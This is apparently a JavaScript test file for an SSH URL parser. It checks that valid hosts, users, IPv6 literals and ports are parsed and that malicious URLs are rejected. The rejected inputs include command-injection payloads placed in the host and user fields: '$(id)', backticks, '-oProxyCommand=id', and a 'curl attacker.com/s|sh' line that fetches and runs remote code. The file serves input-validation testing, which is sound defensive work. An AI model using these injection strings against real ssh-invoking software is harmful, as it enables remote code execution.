import test from 'ava';

import {parseSSHUrl} from '../../app/utils/ssh-url';

test('parseSSHUrl() accepts a plain host', (t) => {
  t.deepEqual(parseSSHUrl('ssh://example.com'), {host: 'example.com'});
});

test('parseSSHUrl() accepts a user, host and port', (t) => {
  t.deepEqual(parseSSHUrl('ssh://my-user@example.com:2222'), {
    host: 'example.com',
    user: 'my-user',
    port: 2222
  });
});

test('parseSSHUrl() accepts an IPv4 literal', (t) => {
  t.deepEqual(parseSSHUrl('ssh://user@192.168.0.1'), {host: '192.168.0.1', user: 'user'});
});

test('parseSSHUrl() unwraps an IPv6 literal', (t) => {
  t.deepEqual(parseSSHUrl('ssh://user@[2001:db8::1]:22'), {host: '2001:db8::1', user: 'user', port: 22});
});

test('parseSSHUrl() ignores the path, query and hash', (t) => {
  t.deepEqual(parseSSHUrl('ssh://example.com/some/path?a=b#c'), {host: 'example.com'});
});

test('parseSSHUrl() rejects other protocols', (t) => {
  t.is(parseSSHUrl('telnet://example.com'), null);
  t.is(parseSSHUrl('file:///etc/passwd'), null);
  t.is(parseSSHUrl('http://example.com'), null);
});

test('parseSSHUrl() rejects URLs parse-url cannot handle', (t) => {
  t.is(parseSSHUrl(''), null);
  t.is(parseSSHUrl('ssh://example.com:not-a-port'), null);
  t.is(parseSSHUrl('ssh://$(touch /tmp/pwned)@example.com'), null);
});

test('parseSSHUrl() rejects shell metacharacters in the host', (t) => {
  // Without validation these produce commands such as `ssh ;id` or
  // `ssh example.com$(id)`, which a shell happily executes.
  t.is(parseSSHUrl('ssh://;id'), null);
  t.is(parseSSHUrl('ssh://example.com;id'), null);
  t.is(parseSSHUrl('ssh://example.com$(id)'), null);
  t.is(parseSSHUrl('ssh://`id`'), null);
  t.is(parseSSHUrl('ssh://;curl${IFS}attacker.com/s|sh;@example.com'), null);
  t.is(parseSSHUrl('ssh://$(touch${IFS}/tmp/pwned)@example.com'), null);
});

test('parseSSHUrl() rejects shell metacharacters in the user', (t) => {
  // parse-url percent-encodes the user, so the decoded value is what matters.
  t.is(parseSSHUrl('ssh://user;id@example.com'), null);
  t.is(parseSSHUrl('ssh://%24%28id%29@example.com'), null);
  t.is(parseSSHUrl('ssh://"a b"@example.com'), null);
});

test('parseSSHUrl() rejects a user that would be read as an ssh option', (t) => {
  t.is(parseSSHUrl('ssh://-oProxyCommand=id@example.com'), null);
});

test('parseSSHUrl() rejects out of range ports', (t) => {
  t.is(parseSSHUrl('ssh://example.com:0'), null);
  t.is(parseSSHUrl('ssh://example.com:70000'), null);
});

test('parseSSHUrl() rejects malformed hosts', (t) => {
  t.is(parseSSHUrl('ssh://-example.com'), null);
  t.is(parseSSHUrl('ssh://exa_mple.com'), null);
  t.is(parseSSHUrl('ssh://[not-an-ipv6]'), null);
  t.is(parseSSHUrl(`ssh://${'a'.repeat(254)}`), null);
});
